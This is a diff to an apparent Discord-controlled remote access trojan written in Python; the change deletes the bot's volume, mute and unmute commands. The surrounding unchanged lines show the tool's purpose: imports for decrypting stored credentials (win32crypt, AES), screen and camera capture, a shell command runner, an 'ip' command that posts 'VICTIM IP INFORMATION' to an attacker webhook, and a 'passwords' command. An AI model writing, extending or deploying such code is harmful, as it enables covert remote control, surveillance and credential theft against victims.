@@ -19,9 +19,6 @@ from Crypto.Cipher import AES
 import win32crypt
 from PIL import ImageGrab
 import cv2
-from ctypes import cast, POINTER
-from comtypes import CLSCTX_ALL
-from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 
 load_dotenv()
 
@@ -73,50 +70,6 @@ def get_ip_geolocation(ip):
         return {'ip': ip, 'error': 'Geolocation failed'}
     except:
         return {'ip': ip, 'error': 'Request failed'}
-
-def set_volume(percent):
-    try:
-        devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-        volume = cast(interface, POINTER(IAudioEndpointVolume))
-        level = float(percent) / 100.0
-        volume.SetMasterVolumeLevelScalar(level, None)
-        return True
-    except Exception as e:
-        print(f"Volume set error: {e}")
-        return False
-
-def get_current_volume():
-    try:
-        devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-        volume = cast(interface, POINTER(IAudioEndpointVolume))
-        level = volume.GetMasterVolumeLevelScalar()
-        percent = int(level * 100)
-        return percent
-    except Exception as e:
-        print(f"Volume get error: {e}")
-        return None
-
-def mute_audio():
-    try:
-        devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-        volume = cast(interface, POINTER(IAudioEndpointVolume))
-        volume.SetMute(1, None)
-        return "Audio muted"
-    except Exception as e:
-        return f"Mute failed: {str(e)}"
-
-def unmute_audio():
-    try:
-        devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-        volume = cast(interface, POINTER(IAudioEndpointVolume))
-        volume.SetMute(0, None)
-        return "Audio unmuted"
-    except Exception as e:
-        return f"Unmute failed: {str(e)}"
 
 def run_command(cmd):
     try:
@@ -410,42 +363,6 @@ async def ip(ctx):
     
     await send_webhook(f"**VICTIM IP INFORMATION**\n```\n{output}\n```")
     await ctx.send("IP information sent to webhook.")
-
-@bot.command()
-async def volume(ctx, percent: int = None):
-    try:
-        if percent is None:
-            current = get_current_volume()
-            if current is not None:
-                await ctx.send(f"Current volume: {current}%")
-                await send_webhook(f"Current volume: {current}%")
-            else:
-                await ctx.send("Failed to get current volume")
-        elif 0 <= percent <= 100:
-            success = set_volume(percent)
-            if success:
-                await ctx.send(f"Volume set to {percent}%")
-                await send_webhook(f"Volume set to {percent}%")
-            else:
-                await ctx.send("Failed to set volume")
-        else:
-            await ctx.send("Volume must be between 0 and 100")
-    except Exception as e:
-        error_msg = f"Volume command failed: {str(e)}"
-        await ctx.send(f"{error_msg}")
-        await send_webhook(error_msg)
-
-@bot.command()
-async def mute(ctx):
-    output = mute_audio()
-    await send_webhook(output)
-    await ctx.send("Audio muted.")
-
-@bot.command()
-async def unmute(ctx):
-    output = unmute_audio()
-    await send_webhook(output)
-    await ctx.send("Audio unmuted.")
 
 @bot.command()
 async def passwords(ctx):
